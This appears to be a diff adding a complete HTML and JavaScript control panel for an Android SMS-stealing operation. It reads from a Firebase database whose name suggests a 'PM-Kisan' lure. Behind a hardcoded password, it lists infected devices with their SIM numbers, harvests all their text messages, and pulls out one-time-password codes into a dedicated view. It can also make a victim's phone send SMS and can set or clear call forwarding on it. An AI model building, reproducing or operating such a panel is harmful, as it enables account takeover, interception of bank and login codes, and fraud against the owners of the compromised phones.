@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Alexa Shoot 376</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:'Space Grotesk',system-ui,sans-serif;background:#0c0a1a;color:#e0e0ff;overflow:hidden;height:100dvh;user-select:none}
+#particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;opacity:.15}
+.glow{position:fixed;top:-40%;left:-20%;width:140%;height:140%;z-index:0;pointer-events:none;background:radial-gradient(ellipse at 30% 40%,rgba(0,200,255,.04),transparent 50%),radial-gradient(ellipse at 70% 60%,rgba(120,50,255,.04),transparent 50%)}
+.scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
+.scr.act{display:flex}
+#logScr{justify-content:center;align-items:center;background:rgba(12,10,26,.96)}
+.lbc{text-align:center;width:88%;max-width:360px;position:relative}
+.lbc::before{content:'';position:absolute;inset:-2px;border-radius:20px;background:linear-gradient(135deg,#00c8ff,#7832ff,#00c8ff);background-size:300% 300%;animation:grad 4s ease infinite;z-index:-1;opacity:.3}
+@keyframes grad{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+.lbc .ib{padding:30px 24px;border-radius:18px;background:rgba(12,10,26,.95);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.04)}
+.lbc .logo{font-size:48px;margin-bottom:6px;display:block}
+.lbc h1{font-size:22px;font-weight:700;background:linear-gradient(135deg,#00c8ff,#7832ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-.5px}
+.lbc .s{color:rgba(255,255,255,.25);font-size:11px;margin:2px 0 24px;letter-spacing:2px}
+.lbc .fi{position:relative;margin-bottom:14px}
+.lbc .fi input{width:100%;padding:14px 16px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);border-radius:12px;color:#e0e0ff;font-family:'Space Grotesk',sans-serif;font-size:15px;outline:none;transition:.3s;padding-right:44px}
+.lbc .fi input:focus{border-color:#00c8ff66;box-shadow:0 0 20px rgba(0,200,255,.05)}
+.lbc .fi input::placeholder{color:rgba(255,255,255,.15)}
+.lbc .fi .ico{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:16px;opacity:.2}
+.lbc button{width:100%;padding:14px;background:linear-gradient(135deg,#00c8ff,#7832ff);border:none;border-radius:12px;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:15px;font-weight:600;cursor:pointer;transition:.3s;letter-spacing:.5px}
+.lbc button:active{transform:scale(.97);opacity:.8}
+.lbc .er{color:#ff4466;font-size:12px;margin-top:10px;display:none}
+.top{background:rgba(12,10,26,.8);backdrop-filter:blur(16px);padding:10px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid rgba(255,255,255,.04);z-index:10;min-height:50px}
+.top .bck{font-size:18px;cursor:pointer;color:rgba(255,255,255,.3);background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);border-radius:8px;padding:6px 12px;font-family:'Space Grotesk',sans-serif;transition:.2s}
+.top .bck:active{background:rgba(255,255,255,.08);transform:scale(.95)}
+.top h2{flex:1;font-size:15px;font-weight:600;letter-spacing:-.2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.top .bdg{font-size:9px;padding:4px 10px;border-radius:20px;border:1px solid rgba(0,200,255,.15);color:#00c8ff;background:rgba(0,200,255,.06);white-space:nowrap;font-weight:600;flex-shrink:0;letter-spacing:.5px}
+.cnt{flex:1;overflow-y:auto;padding:10px 14px;z-index:1;-webkit-overflow-scrolling:touch}
+.cnt::-webkit-scrollbar{width:3px}
+.cnt::-webkit-scrollbar-thumb{background:rgba(120,50,255,.2);border-radius:10px}
+.srch{display:flex;gap:8px;margin-bottom:10px}
+.srch input{flex:1;padding:10px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;color:#e0e0ff;font-family:'Space Grotesk',sans-serif;font-size:12px;outline:none;transition:.3s}
+.srch input:focus{border-color:rgba(0,200,255,.3);box-shadow:0 0 15px rgba(0,200,255,.03)}
+.srch input::placeholder{color:rgba(255,255,255,.15)}
+.cd{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:14px;padding:14px;margin-bottom:10px;backdrop-filter:blur(8px)}
+.cd h3{font-size:10px;color:rgba(255,255,255,.3);font-weight:600;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid rgba(255,255,255,.03);letter-spacing:1.5px;text-transform:uppercase}
+.stg{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
+.stg .s{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:12px;padding:14px 10px;text-align:center}
+.stg .s .v{font-size:24px;font-weight:700;background:linear-gradient(135deg,#00c8ff,#7832ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.stg .s .l{font-size:9px;color:rgba(255,255,255,.2);margin-top:2px;letter-spacing:1px;text-transform:uppercase}
+.qk{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
+.qk .b{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;padding:12px 4px;text-align:center;cursor:pointer;transition:.15s}
+.qk .b:active{background:rgba(0,200,255,.04);border-color:rgba(0,200,255,.15);transform:scale(.96)}
+.qk .b .ic{font-size:20px;display:block;margin-bottom:4px}
+.qk .b .l{font-size:8px;color:rgba(255,255,255,.25);letter-spacing:1px;font-weight:500}
+.dvc{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;margin-bottom:5px;cursor:pointer;transition:.15s}
+.dvc:active{background:rgba(0,200,255,.03);border-color:rgba(0,200,255,.1);transform:scale(.98)}
+.dvc .no{font-size:9px;color:rgba(255,255,255,.15);font-weight:500;min-width:24px;font-family:'JetBrains Mono',monospace}
+.dvc .av{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,rgba(0,200,255,.08),rgba(120,50,255,.08));display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;border:1px solid rgba(255,255,255,.04)}
+.dvc .i{flex:1;min-width:0}
+.dvc .i .n{font-size:13px;font-weight:600;color:#e0e0ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dvc .i .p{font-size:10px;color:rgba(255,255,255,.25);margin-top:1px}
+.dvc .i .m{font-size:10px;color:rgba(255,255,255,.2);margin-top:1px;display:flex;gap:8px;align-items:center}
+.dvc .i .m sp{display:flex;align-items:center;gap:3px}
+.stt{width:6px;height:6px;border-radius:50%;display:inline-block}
+.stt.on{background:#00e676;box-shadow:0 0 8px rgba(0,230,118,.4)}
+.stt.off{background:#ff4466;box-shadow:0 0 6px rgba(255,68,102,.2)}
+.stv{font-size:9px;font-weight:600}
+.stv.on{color:#00e676}
+.stv.off{color:#ff4466}
+.smi{display:flex;gap:10px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.02)}
+.smi:last-child{border-bottom:none}
+.smi .ava{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,rgba(0,200,255,.06),rgba(120,50,255,.06));display:flex;align-items:center;justify-content:center;font-size:11px;color:rgba(255,255,255,.5);flex-shrink:0}
+.smi .b{flex:1;min-width:0}
+.smi .b .sn{font-size:11px;color:rgba(255,255,255,.6);font-weight:500}
+.smi .b .sm{font-size:11px;color:rgba(255,255,255,.3);margin:1px 0;word-break:break-word;line-height:1.3}
+.smi .b .st{font-size:9px;color:rgba(255,255,255,.15);display:flex;gap:8px;align-items:center}
+.smi .b .st .tag{display:inline-block;padding:1px 6px;border-radius:3px;font-size:7px;background:rgba(0,200,255,.06);color:rgba(0,200,255,.4);letter-spacing:.5px}
+.oic{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;padding:10px;margin-bottom:5px}
+.oic .h{display:flex;justify-content:space-between;font-size:9px;color:rgba(255,255,255,.2);margin-bottom:3px}
+.oic .oc{font-family:'JetBrains Mono',monospace;font-size:20px;font-weight:700;background:linear-gradient(135deg,#00c8ff,#7832ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:5px;margin-bottom:2px}
+.oic .od{font-size:9px;color:rgba(255,255,255,.25);word-break:break-all}
+.tbs{display:flex;gap:4px;margin-bottom:10px;overflow-x:auto;padding:2px 0}
+.tbs .t{padding:6px 14px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:8px;color:rgba(255,255,255,.3);font-family:'Space Grotesk',sans-serif;font-size:10px;cursor:pointer;white-space:nowrap;letter-spacing:.5px;transition:.2s;font-weight:500}
+.tbs .t.act{background:rgba(0,200,255,.08);border-color:rgba(0,200,255,.2);color:#00c8ff}
+.hlin{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;padding:12px;font-size:11px;line-height:1.8;color:rgba(255,255,255,.3);font-family:'JetBrains Mono',monospace;word-break:break-all}
+.hlin span{color:rgba(255,255,255,.7)}
+.cp{cursor:pointer;border-bottom:1px dotted rgba(255,255,255,.1);transition:.2s}
+.cp:active{color:#00c8ff;border-color:#00c8ff}
+.sip{display:flex;gap:6px;margin-bottom:6px}
+.sip input{flex:1;padding:10px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:8px;color:#e0e0ff;font-family:'Space Grotesk',sans-serif;font-size:12px;outline:none}
+.sip input:focus{border-color:rgba(0,200,255,.2)}
+.sip input::placeholder{color:rgba(255,255,255,.1)}
+.ab{padding:10px 16px;background:linear-gradient(135deg,#00c8ff,#7832ff);border:none;border-radius:8px;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:11px;font-weight:600;cursor:pointer;transition:.2s;letter-spacing:.3px}
+.ab:active{transform:scale(.95);opacity:.8}
+.ab.sc{background:rgba(255,68,102,.1);color:#ff4466;border:1px solid rgba(255,68,102,.2)}
+.ab.sc:active{background:rgba(255,68,102,.2)}
+#toast{position:fixed;bottom:70px;left:50%;transform:translateX(-50%);background:rgba(12,10,26,.95);border:1px solid rgba(0,200,255,.15);color:#e0e0ff;padding:10px 20px;border-radius:10px;font-size:12px;z-index:99;opacity:0;transition:.35s;backdrop-filter:blur(12px);font-family:'Space Grotesk',sans-serif;letter-spacing:.3px;white-space:nowrap;max-width:88%}
+@media(max-width:480px){.qk{grid-template-columns:repeat(2,1fr)}.stg{grid-template-columns:1fr 1fr}.top{padding:8px 12px;min-height:44px}.cnt{padding:8px 10px}.tbs{flex-wrap:wrap}.tbs .t{font-size:9px;padding:5px 10px}}
+</style>
+</head>
+<body>
+<div class="glow"></div>
+<canvas id="particles"></canvas>
+
+<div id="logScr" class="scr act">
+  <div class="lbc">
+    <div class="ib">
+      <span class="logo">🎯</span>
+      <h1>Shoot Admin 376</h1>
+      <div class="s">SECURE DASHBOARD v3.0</div>
+      <div class="fi"><input type="password" id="loginPass" placeholder="Access Key" autocomplete="off"><span class="ico">⌨</span></div>
+      <button onclick="doLogin()">UNLOCK</button>
+      <div class="er" id="loginErr">Access Denied</div>
+    </div>
+  </div>
+</div>
+
+<div id="mainScr" class="scr">
+  <div class="top"><h2>🎯 Shoot Admin 376</h2><span class="bdg" id="liveBadge">● LIVE</span></div>
+  <div class="cnt">
+    <div class="srch"><input id="srchInp" placeholder="Search devices, numbers, models..."></div>
+    <div class="stg" id="statCards"></div>
+    <div class="qk" id="quickBtns"></div>
+    <div id="mainBody"></div>
+  </div>
+</div>
+
+<div id="detailScr" class="scr">
+  <div class="top"><button class="bck" onclick="closeDet()">←</button><h2 id="detTitle">Device</h2><span class="bdg" id="detBadge"></span></div>
+  <div class="cnt">
+    <div id="detInfo"></div>
+    <div class="tbs" id="detTabs"></div>
+    <div id="detSendArea" style="display:none">
+      <div class="cd"><h3>📤 Send SMS / Set Forwarding</h3>
+        <div class="sip"><input id="sendPhone" placeholder="Phone number (with country code)"></div>
+        <div class="sip"><input id="sendMsg" placeholder="SMS message (leave empty for call forward only)"></div>
+        <div class="sip" style="gap:6px">
+          <button class="ab" onclick="doSendSms()" style="flex:1">📤 Send SMS</button>
+          <button class="ab sc" onclick="doSetForward()" style="flex:1">↪ Set Forward</button>
+        </div>
+      </div>
+    </div>
+    <div id="detBody"></div>
+  </div>
+</div>
+
+<div id="allSmsScr" class="scr">
+  <div class="top"><button class="bck" onclick="closeAllSms()">←</button><h2>All SMS</h2><span class="bdg" id="allSmsCnt">0</span></div>
+  <div class="cnt">
+    <div class="srch"><input id="smsSrch" placeholder="Search SMS content, sender..."></div>
+    <div id="allSmsBody"></div>
+  </div>
+</div>
+
+<div id="otpScr" class="scr">
+  <div class="top"><button class="bck" onclick="closeOtps()">←</button><h2>🔑 All OTPs</h2><span class="bdg" id="otpCnt">0</span></div>
+  <div class="cnt"><div id="otpBody"></div></div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+const c=document.getElementById('particles'),cx=c.getContext('2d');
+c.width=innerWidth;c.height=innerHeight;
+const pts=[];
+for(let i=0;i<60;i++){pts.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*1.5+0.5,dx:(Math.random()-0.5)*0.4,dy:(Math.random()-0.5)*0.4})}
+function drawPts(){cx.clearRect(0,0,c.width,c.height);pts.forEach(p=>{p.x+=p.dx;p.y+=p.dy;if(p.x<0||p.x>c.width)p.dx*=-1;if(p.y<0||p.y>c.height)p.dy*=-1;cx.beginPath();cx.arc(p.x,p.y,p.r,0,Math.PI*2);cx.fillStyle='rgba(0,200,255,0.4)';cx.fill()});requestAnimationFrame(drawPts)}
+drawPts();
+addEventListener('resize',()=>{c.width=innerWidth;c.height=innerHeight});
+
+const DB='https://pm-kisan-05jg-default-rtdb.firebaseio.com';
+const ROOT='csc5';
+let devInfo={}, smsData={}, simInfo={}, callFor={}, fwdStatus={};
+let srchQ='', smsSrchQ='', curDid='', curDev={}, detTab='info';
+let deTimer, pollTimer;
+let isLoggedIn=false;
+
+async function fbGet(path){try{const r=await fetch(DB+'/'+path+'.json');return await r.json()}catch(e){return null}}
+async function fbSet(path,val){try{await fetch(DB+'/'+path+'.json',{method:'PUT',body:JSON.stringify(val),headers:{'Content-Type':'application/json'}})}catch(e){}}
+async function fbUpd(path,val){try{const r=await fetch(DB+'/'+path+'.json');const cur=await r.json()||{};await fetch(DB+'/'+path+'.json',{method:'PUT',body:JSON.stringify({...cur,...val}),headers:{'Content-Type':'application/json'}})}catch(e){}}
+
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';
+  clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500);
+}
+
+function copyT(t){
+  const ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();try{document.execCommand('copy');showToast('Copied')}catch(e){}document.body.removeChild(ta);
+}
+
+const PW='Alexa';
+
+function doLogin(){
+  const p=document.getElementById('loginPass').value.trim();
+  if(p!==PW){document.getElementById('loginErr').style.display='block';return}
+  document.getElementById('logScr').classList.remove('act');
+  document.getElementById('mainScr').classList.add('act');
+  isLoggedIn=true;
+  loadData();
+}
+
+function dbUpdate(){clearTimeout(deTimer);deTimer=setTimeout(renderUI,400)}
+
+async function pollData(){
+  const d=await fbGet(ROOT+'/All_User')||{};
+  devInfo=d.Info||{};
+  smsData=d.Sms||{};
+  simInfo=d.SimINFO||{};
+  callFor=d.Call_For||{};
+  fwdStatus=d.Forwad_Status||{};
+  const bdg=document.getElementById('liveBadge');
+  if(bdg){bdg.textContent='● LIVE';bdg.className='bdg'}
+  dbUpdate();
+}
+
+function loadData(){
+  pollData();
+  pollTimer=setInterval(pollData,5000);
+}
+
+function getDeviceIds(){
+  const ids=new Set();
+  Object.keys(devInfo).forEach(k=>{if(devInfo[k].did)ids.add(devInfo[k].did)});
+  return [...ids];
+}
+
+function getDevices(){
+  const map={};
+  Object.keys(devInfo).forEach(k=>{
+    const d=devInfo[k];
+    if(d.did){
+      if(!map[d.did])map[d.did]={did:d.did,info:[],sim:null,sms:[],callFor:null,fwdStatus:null,infoKey:k};
+      map[d.did].info.push({...d,infoKey:k});
+    }
+  });
+  getDeviceIds().forEach(did=>{
+    if(simInfo[did])map[did].sim=simInfo[did];
+    if(smsData[did]){Object.keys(smsData[did]).forEach(k=>{map[did].sms.push({...smsData[did][k],smsKey:k})})}
+    if(callFor[did])map[did].callFor=callFor[did];
+    if(fwdStatus[did])map[did].fwdStatus=fwdStatus[did];
+  });
+  return Object.values(map).filter(d=>d.info.length>0);
+}
+
+function getAllSms(){
+  const list=[];
+  getDevices().forEach(d=>{d.sms.forEach(s=>{list.push({...s,did:d.did,name:d.info[0]?.Name||''})})});
+  list.sort((a,b)=>((b.date||0)-(a.date||0)));
+  return list;
+}
+
+function getDetByDid(did){
+  const d=devInfo[Object.keys(devInfo).find(k=>devInfo[k].did===did)];
+  return d||{};
+}
+
+function getDevName(did){
+  const d=getDetByDid(did);
+  return d.Name||did.slice(0,8);
+}
+
+function getDevPhone(did){
+  const s=simInfo[did];
+  if(s){
+    const p=s.sim1?.split(' - ')[0]?.trim();
+    if(p&&p!=='null')return p;
+  }
+  return '';
+}
+
+function getDevBattery(did){
+  const d=getDetByDid(did);
+  return d.Battery||'';
+}
+
+function isOnline(did){
+  const d=getDetByDid(did);
+  return d.status==='Online'||d.status==='online';
+}
+
+function showScr(id){
+  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
+  document.getElementById(id).classList.add('act');
+}
+
+function renderUI(){
+  if(!isLoggedIn)return;
+  const scr=document.querySelector('.scr.act');
+  if(!scr)return;
+  const id=scr.id;
+  if(id==='mainScr')renderDash();
+  else if(id==='detailScr'&&curDid)renderDet();
+  else if(id==='allSmsScr')renderAllSms();
+  else if(id==='otpScr')renderOtps();
+}
+
+function renderDash(){
+  const devs=getDevices();
+  const smsList=getAllSms();
+  const otpList=smsList.filter(s=>(s.msg||'').toUpperCase().includes('OTP'));
+  const online=devs.filter(d=>isOnline(d.did)).length;
+  document.getElementById('statCards').innerHTML=`
+    <div class="s"><div class="v">${devs.length}</div><div class="l">Devices</div></div>
+    <div class="s"><div class="v">${smsList.length}</div><div class="l">SMS</div></div>
+    <div class="s"><div class="v">${online}</div><div class="l">Online</div></div>
+    <div class="s"><div class="v">${otpList.length}</div><div class="l">OTPs</div></div>`;
+  document.getElementById('quickBtns').innerHTML=`
+    <div class="b" onclick="showScr('mainScr');renderDash()"><span class="ic">📱</span><span class="l">Devices</span></div>
+    <div class="b" onclick="showOtps()"><span class="ic">🔑</span><span class="l">OTPs</span></div>
+    <div class="b" onclick="showScr('allSmsScr');renderAllSms()"><span class="ic">📨</span><span class="l">All SMS</span></div>
+    <div class="b" onclick="showScr('mainScr')"><span class="ic">🔄</span><span class="l">Refresh</span></div>`;
+  const q=srchQ.toLowerCase();
+  const filtered=q?devs.filter(d=>d.did.toLowerCase().includes(q)||getDevName(d.did).toLowerCase().includes(q)||getDevPhone(d.did).includes(q)||(d.info[0]?.infoKey||'').toLowerCase().includes(q)):devs;
+  document.getElementById('mainBody').innerHTML=`<div class="cd"><h3>📱 Devices (${filtered.length}/${devs.length})</h3>
+    ${filtered.map((d,i)=>`
+      <div class="dvc" onclick="openDet('${d.did}')">
+        <span class="no">#${i+1}</span>
+        <div class="av">${(getDevName(d.did)[0]||'?').toUpperCase()}</div>
+        <div class="i">
+          <div class="n">${getDevName(d.did)} <span class="stt ${isOnline(d.did)?'on':'off'}"></span></div>
+          <div class="p">${getDevPhone(d.did)?'📞 '+getDevPhone(d.did):''} ${getDevBattery(d.did)?'🔋'+getDevBattery(d.did)+'%':''}</div>
+          <div class="m"><sp>📨 ${d.sms.length}</sp><sp>${d.sim?.dualSim==='Yes'?'📱 Dual SIM':''}</sp></div>
+        </div>
+      </div>`).join('')}
+    ${!filtered.length?'<div style="padding:30px;text-align:center;color:rgba(255,255,255,.1);font-size:12px">'+(q?'No match':'No devices')+'</div>':''}
+  </div>`;
+}
+
+document.getElementById('srchInp').addEventListener('input',function(){srchQ=this.value;renderDash()});
+document.getElementById('smsSrch')?.addEventListener('input',function(){smsSrchQ=this.value;renderAllSms()});
+
+function openDet(did){
+  curDid=did;
+  detTab='info';
+  renderDet();
+  showScr('detailScr');
+}
+
+function renderDet(){
+  const dev=getDevices().find(d=>d.did===curDid);
+  if(!dev){showToast('No data');return}
+  curDev=dev;
+  const ol=isOnline(dev.did);
+  const ph=getDevPhone(dev.did);
+  const sim=simInfo[dev.did];
+  const fwd=dev.callFor||dev.fwdStatus;
+  document.getElementById('detTitle').textContent=getDevName(dev.did);
+  document.getElementById('detBadge').textContent=ol?'Online':'Offline';
+  document.getElementById('detInfo').innerHTML=`
+    <div class="cd"><h3>${getDevName(dev.did)}</h3>
+      <div class="hlin">
+        <div>ID  : <span>${dev.did}</span></div>
+        ${ph?`<div>PHN : <span class="cp" onclick="copyT('${ph}')">${ph}</span></div>`:''}
+        ${sim?`<div>SIM1: <span>${sim.sim1||'-'}</span></div>`:''}
+        ${sim?.sim2?`<div>SIM2: <span>${sim.sim2||'-'}</span></div>`:''}
+        ${sim?.dualSim?`<div>Dual: <span>${sim.dualSim}</span></div>`:''}
+        ${getDevBattery(dev.did)?`<div>BAT : <span>${getDevBattery(dev.did)}%</span></div>`:''}
+        <div>STA : <span style="color:${ol?'#00e676':'#ff4466'}">${ol?'Online':'Offline'}</span></div>
+        ${fwd?`<div>FWD : <span>${fwd.PhoneNumber||'-'} (${fwd.Status||'-'})</span></div>`:''}
+      </div></div>`;
+  document.getElementById('detTabs').innerHTML=`
+    <div class="t ${detTab==='info'?'act':''}" onclick="swDet('info')">ℹ Info</div>
+    <div class="t ${detTab==='sms'?'act':''}" onclick="swDet('sms')">📨 SMS (${dev.sms.length})</div>
+    <div class="t ${detTab==='otp'?'act':''}" onclick="swDet('otp')">🔑 OTP</div>
+    <div class="t ${detTab==='send'?'act':''}" onclick="swDet('send')">📤 Send</div>
+    <div class="t ${detTab==='fwd'?'act':''}" onclick="swDet('fwd')">↪ Forward</div>`;
+  document.getElementById('detSendArea').style.display='none';
+  document.getElementById('detBody').innerHTML='';
+  if(detTab==='info'){
+    let h='<div class="cd"><h3>📋 All Info</h3><div class="hlin">';
+    dev.info.forEach(i=>{Object.keys(i).filter(k=>k!=='did').forEach(k=>{h+=`<div>${k}: <span>${i[k]}</span></div>`})});
+    if(sim)Object.keys(sim).forEach(k=>{h+=`<div>SIM.${k}: <span>${sim[k]}</span></div>`});
+    if(fwd)Object.keys(fwd).forEach(k=>{h+=`<div>FWD.${k}: <span>${fwd[k]}</span></div>`});
+    h+='</div></div>';
+    document.getElementById('detBody').innerHTML=h;
+  }else if(detTab==='send'){
+    document.getElementById('detSendArea').style.display='block';
+    document.getElementById('sendPhone').value=ph||'';
+    document.getElementById('sendMsg').value='';
+  }else if(detTab==='fwd'){
+    document.getElementById('detBody').innerHTML=`<div class="cd"><h3>↪ Call Forwarding</h3>
+      ${fwd?`<div class="hlin"><div>Number: <span>${fwd.PhoneNumber||'-'}</span></div><div>Status: <span>${fwd.Status||'-'}</span></div><div>Type: <span>${fwd.Type||'-'}</span></div><div>SubID: <span>${fwd.SubID||'-'}</span></div></div>
+      <div style="margin-top:10px"><button class="ab sc" onclick="doClearForward()" style="width:100%">❌ Clear Forwarding</button></div>`:'<div style="padding:20px;text-align:center;color:rgba(255,255,255,.08)">No forwarding config</div>'}
+    </div>`;
+  }else if(detTab==='otp'){
+    const otps=dev.sms.filter(s=>(s.msg||'').toUpperCase().includes('OTP'));
+    document.getElementById('detBody').innerHTML=`<div class="cd"><h3>🔑 OTPs (${otps.length})</h3>
+      ${otps.length?otps.map(s=>`<div class="oic"><div class="h"><span>${s.ph||'?'}</span><span>${s.date?new Date(parseInt(s.date)).toLocaleString():''}</span></div><div class="oc">${(s.msg||'').replace(/[^0-9]/g,'').slice(0,8)}</div><div class="od">${(s.msg||'').slice(0,120)}</div></div>`).join(''):'<div style="padding:20px;text-align:center;color:rgba(255,255,255,.08)">No OTPs</div>'}
+    </div>`;
+  }else{
+    const sms=dev.sms.sort((a,b)=>((b.date||0)-(a.date||0)));
+    document.getElementById('detBody').innerHTML=`<div class="cd"><h3>📨 Messages (${sms.length})</h3>
+      ${sms.length?sms.map(s=>`<div class="smi"><div class="ava">${(s.ph||'?')[0]}</div><div class="b"><div class="sn">${s.ph||'?'}</div><div class="sm">${s.msg||''}</div><div class="st">${s.date?new Date(parseInt(s.date)).toLocaleString():''}</div></div></div>`).join(''):'<div style="padding:20px;text-align:center;color:rgba(255,255,255,.08)">No messages</div>'}
+    </div>`;
+  }
+}
+
+function swDet(t){
+  detTab=t;
+  document.getElementById('detSendArea').style.display='none';
+  renderDet();
+}
+
+function showOtps(){
+  showScr('otpScr');
+  renderOtps();
+}
+
+function renderOtps(){
+  const all=getAllSms();
+  const otps=all.filter(s=>(s.msg||'').toUpperCase().includes('OTP'));
+  document.getElementById('otpCnt').textContent=otps.length;
+  document.getElementById('otpBody').innerHTML=`
+    <div class="cd"><h3>🔑 All OTPs (${otps.length})</h3>
+      ${otps.map(s=>`<div class="oic"><div class="h"><span>${s.ph||'?'}</span><span>${s.date?new Date(parseInt(s.date)).toLocaleString():''}</span><span style="font-size:7px;color:rgba(255,255,255,.1)">${s.name||s.did?.slice(0,8)}</span></div><div class="oc">${(s.msg||'').replace(/[^0-9]/g,'').slice(0,8)}</div><div class="od">${(s.msg||'').slice(0,120)}</div></div>`).join('')}
+      ${!otps.length?'<div style="padding:30px;text-align:center;color:rgba(255,255,255,.08)">No OTPs</div>':''}
+    </div>`;
+}
+
+function renderAllSms(){
+  const all=getAllSms();
+  const q=smsSrchQ.toLowerCase();
+  const filtered=q?all.filter(s=>(s.msg||'').toLowerCase().includes(q)||(s.ph||'').toLowerCase().includes(q)):all;
+  document.getElementById('allSmsCnt').textContent=all.length;
+  document.getElementById('allSmsBody').innerHTML=`
+    <div class="cd"><h3>📨 All SMS (${filtered.length}/${all.length})</h3>
+      ${filtered.slice(0,200).map(s=>`<div class="smi" onclick="openDet('${s.did}')"><div class="ava">${(s.ph||'?')[0]}</div><div class="b"><div class="sn">${s.ph||'?'} <span style="font-size:8px;color:rgba(255,255,255,.1)">via ${s.name||s.did?.slice(0,8)}</span></div><div class="sm">${s.msg||''}</div><div class="st">${s.date?new Date(parseInt(s.date)).toLocaleString():''}</div></div></div>`).join('')}
+      ${!filtered.length?'<div style="padding:30px;text-align:center;color:rgba(255,255,255,.08);font-size:12px">'+(q?'No match':'No messages')+'</div>':''}
+      ${filtered.length>200?'<div style="text-align:center;padding:10px;color:rgba(255,255,255,.08);font-size:10px">Showing 200 of '+filtered.length+'</div>':''}
+    </div>`;
+}
+
+async function doSendSms(){
+  const to=document.getElementById('sendPhone').value.trim();
+  const msg=document.getElementById('sendMsg').value.trim();
+  if(!to||!msg){showToast('Fill phone and message');return}
+  await fbSet('Verify_Device/'+curDid,{Body:msg,Number:to,Status:'Sent',From:'Alexa',Time:Date.now()});
+  showToast('SMS sent to '+to);
+  document.getElementById('sendMsg').value='';
+}
+
+async function doSetForward(){
+  const to=document.getElementById('sendPhone').value.trim();
+  if(!to){showToast('Enter forwarding number');return}
+  const cur=await fbGet(ROOT+'/All_User/Call_For/'+curDid)||{};
+  await fbSet(ROOT+'/All_User/Call_For/'+curDid,{...cur,PhoneNumber:to,Status:'Active',Type:'Active'});
+  showToast('Forwarding set to '+to);
+}
+
+async function doClearForward(){
+  const cur=await fbGet(ROOT+'/All_User/Call_For/'+curDid)||{};
+  await fbSet(ROOT+'/All_User/Call_For/'+curDid,{...cur,PhoneNumber:'0',Status:'No',Type:'No'});
+  showToast('Forwarding cleared');
+}
+
+window.closeDet=()=>{curDid='';showScr('mainScr');renderDash()};
+window.closeAllSms=()=>{showScr('mainScr');renderDash()};
+window.closeOtps=()=>{showScr('mainScr');renderDash()};
+
+document.getElementById('loginPass').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
+</script>
+</body>
+</html>
